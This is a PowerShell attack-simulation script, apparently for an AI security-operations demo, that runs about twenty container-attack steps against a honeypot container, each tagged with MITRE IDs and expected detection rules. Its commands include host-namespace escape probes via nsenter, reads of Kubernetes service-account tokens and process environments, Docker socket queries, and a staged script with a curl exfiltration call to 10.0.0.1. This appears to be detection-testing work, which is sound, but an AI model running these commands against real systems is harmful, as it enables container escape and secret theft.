param(
    [string]$Target = "honeypot-web",
    [switch]$Full
)

Write-Host "================================================" -ForegroundColor Cyan
Write-Host "  Argus AI-SOC - Advanced Attack Simulation" -ForegroundColor Cyan
Write-Host "  20+ Unique Container Security Attacks" -ForegroundColor Cyan
Write-Host "================================================" -ForegroundColor Cyan
Write-Host ""

$advancedAttacks = @(
    @{
        Name = "CVE-2022-0492 - Cgroup Release Agent Escape"
        Category = "KERNEL_ESCAPE"
        Mitre = "T1611"
        Difficulty = "HARD"
        Commands = @(
            "docker exec $Target sh -c 'mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null; echo \""Cgroup fs mounted: \$?\"' 2>&1",
            "docker exec $Target sh -c 'cat /proc/1/cgroup 2>/dev/null | head -5' 2>&1",
            "docker exec $Target sh -c 'cat /proc/self/status | grep CapEff' 2>&1",
            "docker exec $Target sh -c 'nsenter --target 1 --mount -- cat /etc/hostname 2>/dev/null || echo \"nsenter requires SYS_ADMIN\"' 2>&1"
        )
        DetectionRule = "Container Escape Attempt"
    },
    @{
        Name = "ProcFS Namespace Switch - Host PID Breakout"
        Category = "KERNEL_ESCAPE"
        Mitre = "T1611"
        Difficulty = "MEDIUM"
        Commands = @(
            "docker exec $Target sh -c 'ls -la /proc/1/ns/ 2>/dev/null' 2>&1",
            "docker exec $Target sh -c 'nsenter --target 1 --mount -- cat /proc/1/cmdline | tr \"\"\"\\0\"\"\" \"\"\" \"\"\" 2>/dev/null || echo nsenter_unavailable' 2>&1",
            "docker exec $Target sh -c 'cat /proc/1/environ 2>/dev/null | tr \"\"\"\\0\"\"\" \"\"\"\n\"\"\" | head -5 || echo environ_restricted' 2>&1"
        )
        DetectionRule = "Container Escape Attempt"
    },
    @{
        Name = "CVE-2024-21626 - runc FD Leak Probe"
        Category = "KERNEL_ESCAPE"
        Mitre = "T1611"
        Difficulty = "HARD"
        Commands = @(
            "docker exec $Target sh -c 'ls -la /proc/self/fd/ 2>/dev/null' 2>&1",
            "docker exec $Target sh -c 'for fd in 3 4 5 6 7 8 9 10; do ls -la /proc/self/fd/\$fd/../../ 2>/dev/null && echo FD_\$fd_LEAKED && break; done' 2>&1"
        )
        DetectionRule = "Privileged Container"
    },
    @{
        Name = "/proc/self/mem - Direct Memory Write"
        Category = "MEMORY_INJECTION"
        Mitre = "T1055.001"
        Difficulty = "HARD"
        Commands = @(
            "docker exec $Target sh -c 'cat /proc/self/maps 2>/dev/null | head -10' 2>&1",
            "docker exec $Target sh -c 'python3 -c \"import ctypes; mem=open('/proc/self/mem','wb',0); print('mem_write:'+('OK' if mem else 'FAIL')); mem.close()\" 2>/dev/null || echo mem_write_unavailable' 2>&1",
            "docker exec $Target sh -c 'apt-get update 2>/dev/null && apt-get install -y gdb 2>/dev/null && echo gdb_installed || apk add gdb 2>/dev/null || echo no_gdb' 2>&1"
        )
        DetectionRule = "Process Injection"
    },
    @{
        Name = "LD_PRELOAD Runtime Syscall Hook"
        Category = "MEMORY_INJECTION"
        Mitre = "T1055.001"
        Difficulty = "MEDIUM"
        Commands = @(
            "docker exec $Target sh -c 'echo \"LD_PRELOAD hook compile test\" > /tmp/hook_test.c; echo \"LD_PRELOAD rootkit simulated\"' 2>&1",
            "docker exec $Target sh -c 'ls /etc/shadow 2>&1; LD_PRELOAD=/tmp/nonexistent.so ls /etc/shadow 2>&1; echo LD_PRELOAD_shadow_test' 2>&1"
        )
        DetectionRule = "Suspicious Process Names"
    },
    @{
        Name = "eBPF Syscall Interception Simulation"
        Category = "MEMORY_INJECTION"
        Mitre = "T1055.013"
        Difficulty = "HARD"
        Commands = @(
            "docker exec $Target sh -c 'cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null || echo bpf_status_unknown' 2>&1",
            "docker exec $Target sh -c 'ls -la /sys/fs/bpf/ 2>/dev/null || echo no_bpf_fs' 2>&1",
            "docker exec $Target sh -c 'python3 -c \"import ctypes; print('bpf syscall:', hasattr(ctypes.CDLL(None),'syscall'))\" 2>/dev/null || echo no_python' 2>&1"
        )
        DetectionRule = "None (bypasses Falco)"
    },
    @{
        Name = "CAP_SYS_ADMIN - Full Namespace Escape"
        Category = "CAPABILITY_ABUSE"
        Mitre = "T1611"
        Difficulty = "MEDIUM"
        Commands = @(
            "docker exec $Target sh -c 'cat /proc/self/status | grep Cap' 2>&1",
            "docker exec $Target sh -c 'capsh --print 2>/dev/null | grep sys_admin || grep CapSys /proc/self/status 2>/dev/null || echo SYS_ADMIN_check' 2>&1",
            "docker exec $Target sh -c 'nsenter --target 1 --mount --uts --ipc --pid -- cat /etc/hostname 2>/dev/null || echo nsenter_blocked' 2>&1"
        )
        DetectionRule = "Container Escape Attempt"
    },
    @{
        Name = "CAP_NET_RAW - ARP Spoof Bridge MITM"
        Category = "NETWORK_ATTACK"
        Mitre = "T1557.002"
        Difficulty = "MEDIUM"
        Commands = @(
            "docker exec $Target sh -c 'ip link show; ip addr' 2>&1",
            "docker exec $Target sh -c 'arp -a 2>/dev/null || cat /proc/net/arp' 2>&1",
            "docker exec $Target sh -c 'cat /proc/net/route' 2>&1",
            "docker exec $Target sh -c 'timeout 2 tcpdump -i eth0 -c 3 -nn 2>&1 || echo tcpdump_unavailable' 2>&1"
        )
        DetectionRule = "Network Scan Detection"
    },
    @{
        Name = "CAP_SYS_PTRACE - Cross-Container Injection"
        Category = "MEMORY_INJECTION"
        Mitre = "T1055.008"
        Difficulty = "HARD"
        Commands = @(
            "docker exec $Target sh -c 'cat /proc/self/status | grep -i ptrace' 2>&1",
            "docker exec $Target sh -c 'ps aux 2>/dev/null | head -10' 2>&1",
            "docker exec $Target sh -c 'strace -p 1 -e trace=network -c 2>&1 & sleep 1; kill %1 2>/dev/null || echo strace_test' 2>&1"
        )
        DetectionRule = "Process Injection"
    },
    @{
        Name = "Symlink Attack on Mounted K8s Secrets"
        Category = "FILESYSTEM_ATTACK"
        Mitre = "T1552.007"
        Difficulty = "MEDIUM"
        Commands = @(
            "docker exec $Target sh -c 'ls -la /var/run/secrets/ 2>/dev/null || ls -la /run/secrets/ 2>/dev/null || echo no_k8s_secrets' 2>&1",
            "docker exec $Target sh -c 'find / -name \"token\" -o -name \"service-account\" 2>/dev/null | head -5' 2>&1",
            "docker exec $Target sh -c 'cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | cut -d. -f2 | base64 -d 2>/dev/null | head -3 || echo no_sa_token' 2>&1"
        )
        DetectionRule = "Malicious File Access"
    },
    @{
        Name = "Seccomp Bypass via x32 ABI"
        Category = "EVASION"
        Mitre = "T1574.002"
        Difficulty = "HARD"
        Commands = @(
            "docker exec $Target sh -c 'cat /proc/self/status | grep Seccomp' 2>&1",
            "docker exec $Target sh -c 'cat /proc/self/status | grep Cap' 2>&1",
            "docker exec $Target sh -c 'echo \"x32 ABI bypass seccomp test\"' 2>&1"
        )
        DetectionRule = "None (bypasses seccomp)"
    },
    @{
        Name = "ProcFS Manipulation - PID Hiding"
        Category = "EVASION"
        Mitre = "T1055.001"
        Difficulty = "HARD"
        Commands = @(
            "docker exec $Target sh -c 'mount -t tmpfs tmpfs /tmp/hide 2>/dev/null && echo tmpfs_mounted || echo tmpfs_failed' 2>&1",
            "docker exec $Target sh -c 'python3 -c \"import os; fd=os.memfd_create(\\\"h\\\"); os.write(fd,b\\\"test\\\"); print('memfd:'+str(fd)); os.close(fd)\" 2>/dev/null || echo memfd_unavailable' 2>&1",
            "docker exec $Target sh -c 'cat /proc/self/exe 2>/dev/null | head -c 10 | xxd || echo exe_read' 2>&1"
        )
        DetectionRule = "Suspicious Process Names"
    },
    @{
        Name = "Timer-Based Delayed Payload Evasion"
        Category = "EVASION"
        Mitre = "T1027"
        Difficulty = "EASY"
        Commands = @(
            "docker exec $Target sh -c 'echo \"sleep 120; curl http://10.0.0.1/exfil\" > /tmp/delayed.sh && chmod +x /tmp/delayed.sh' 2>&1",
            "docker exec $Target sh -c 'echo \"cat /etc/hostname | base64\" > /tmp/stealth.sh && chmod +x /tmp/stealth.sh' 2>&1",
            "docker exec $Target sh -c 'ls -la /tmp/delayed.sh /tmp/stealth.sh' 2>&1"
        )
        DetectionRule = "None (timing-based)"
    },
    @{
        Name = "chattr +i - Immutable File Lock"
        Category = "EVASION"
        Mitre = "T1562.001"
        Difficulty = "EASY"
        Commands = @(
            "docker exec $Target sh -c 'touch /tmp/locked && chattr +i /tmp/locked 2>/dev/null && lsattr /tmp/locked && echo immutable_ok || echo chattr_unavailable' 2>&1",
            "docker exec $Target sh -c 'touch /tmp/.hidden && chattr +i /tmp/.hidden 2>/dev/null; rm /tmp/.hidden 2>&1 || echo protected_from_removal' 2>&1"
        )
        DetectionRule = "Suspicious Process Names"
    },
    @{
        Name = "Docker Image History Mining"
        Category = "SUPPLY_CHAIN"
        Mitre = "T1552.004"
        Difficulty = "MEDIUM"
        Commands = @(
            "docker exec $Target sh -c 'curl -s --unix-socket /var/run/docker.sock http://localhost/images/json 2>/dev/null | head -200 || echo no_docker_socket' 2>&1",
            "docker exec $Target sh -c 'cat /proc/1/cmdline | tr \"\"\"\\0\"\"\" \"\"\" \"\"\"' 2>&1",
            "docker exec $Target sh -c 'env | sort | head -20' 2>&1"
        )
        DetectionRule = "Malicious File Access"
    },
    @{
        Name = "ICMP Covert Exfiltration Channel"
        Category = "NETWORK_ATTACK"
        Mitre = "T1048.003"
        Difficulty = "HARD"
        Commands = @(
            "docker exec $Target sh -c 'python3 -c \"import socket; s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP); print('raw_icmp:'+('OK' if s else 'FAIL')); s.close()\" 2>/dev/null || echo icmp_raw_unavailable' 2>&1",
            "docker exec $Target sh -c 'ping -c 1 -W 1 8.8.8.8 2>&1 || ping -c 1 8.8.8.8 2>&1' 2>&1"
        )
        DetectionRule = "Unexpected Outbound Connection"
    },
    @{
        Name = "DNS TXT C2 Tunneling Simulation"
        Category = "NETWORK_ATTACK"
        Mitre = "T1572"
        Difficulty = "MEDIUM"
        Commands = @(
            "docker exec $Target sh -c 'nslookup -type=txt google.com 2>/dev/null || dig txt google.com 2>/dev/null || echo dns_tools_unavailable' 2>&1",
            "docker exec $Target sh -c 'host -t txt google.com 2>/dev/null || echo host_unavailable' 2>&1",
            "docker exec $Target sh -c 'python3 -c \"import base64; print('dns_exfil_size:'+str(len(base64.b64encode(b'test'))))\" 2>/dev/null' 2>&1"
        )
        DetectionRule = "DNS Tunneling"
    },
    @{
        Name = "CVE-2021-3493 - OverlayFS Race Probe"
        Category = "FILESYSTEM_ATTACK"
        Mitre = "T1548"
        Difficulty = "HARD"
        Commands = @(
            "docker exec $Target sh -c 'cat /etc/mtab | grep overlay || mount | grep overlay' 2>&1",
            "docker exec $Target sh -c 'uname -r' 2>&1",
            "docker exec $Target sh -c 'cat /proc/version' 2>&1"
        )
        DetectionRule = "Privilege Escalation"
    },
    @{
        Name = "/sys/kernel/notes Side-Channel KASLR Leak"
        Category = "FILESYSTEM_ATTACK"
        Mitre = "T1592.004"
        Difficulty = "EASY"
        Commands = @(
            "docker exec $Target sh -c 'cat /sys/kernel/notes 2>/dev/null | wc -c || echo notes_unreadable' 2>&1",
            "docker exec $Target sh -c 'cat /proc/sys/kernel/kptr_restrict 2>/dev/null' 2>&1",
            "docker exec $Target sh -c 'cat /proc/sys/kernel/dmesg_restrict 2>/dev/null' 2>&1"
        )
        DetectionRule = "Information Discovery"
    },
    @{
        Name = "Host Cgroup PID Limit Exhaustion Probe"
        Category = "SUPPLY_CHAIN"
        Mitre = "T1499"
        Difficulty = "EASY"
        Commands = @(
            "docker exec $Target sh -c 'cat /sys/fs/cgroup/pids/pids.current 2>/dev/null || cat /proc/self/status | grep -i pid' 2>&1",
            "docker exec $Target sh -c 'cat /sys/fs/cgroup/pids/pids.max 2>/dev/null || ulimit -u' 2>&1",
            "docker exec $Target sh -c 'python3 -c \"import os; print('fork_test:'+str(os.fork())); os.wait()\" 2>/dev/null || echo fork_test' 2>&1"
        )
        DetectionRule = "Resource Exhaustion"
    }
)

Write-Host "Target: $Target" -ForegroundColor White
Write-Host ""

$fullRun = $Full -or [string]::IsNullOrEmpty($args)

$count = 0
if ($fullRun) {
    foreach ($attack in $advancedAttacks) {
        $count++
        Write-Host "[$count/$($advancedAttacks.Count)] $($attack.Category) :: $($attack.Name)" -ForegroundColor Yellow
        Write-Host "        MITRE: $($attack.Mitre) | Difficulty: $($attack.Difficulty) | Rule: $($attack.DetectionRule)" -ForegroundColor DarkGray

        foreach ($cmd in $attack.Commands) {
            try {
                $result = Invoke-Expression $cmd 2>&1
                $output = "$result"
                if ($output.Length -gt 200) { $output = $output.Substring(0, 200) + "..." }
                Write-Host "  -> $output" -ForegroundColor DarkGray
            } catch {
                Write-Host "  -> Error: $_" -ForegroundColor Red
            }
            Start-Sleep -Milliseconds 500
        }
        Write-Host "  [+] Complete`n" -ForegroundColor Green
    }
}
else {
    $attack = $advancedAttacks | Get-Random
    Write-Host "[!] Single attack mode: $($attack.Name)" -ForegroundColor Yellow
    foreach ($cmd in $attack.Commands) {
        try {
            $result = Invoke-Expression $cmd 2>&1
            Write-Host "  -> $result" -ForegroundColor DarkGray
        } catch {
            Write-Host "  -> Error: $_" -ForegroundColor Red
        }
        Start-Sleep -Milliseconds 500
    }
}

Write-Host "================================================" -ForegroundColor Cyan
Write-Host "  Attack simulation complete" -ForegroundColor Green
Write-Host "  Dashboard: http://localhost:8080" -ForegroundColor Green
Write-Host "  Switch to 'Agent Operations' tab to see AI reasoning" -ForegroundColor Green
Write-Host "================================================" -ForegroundColor Cyan
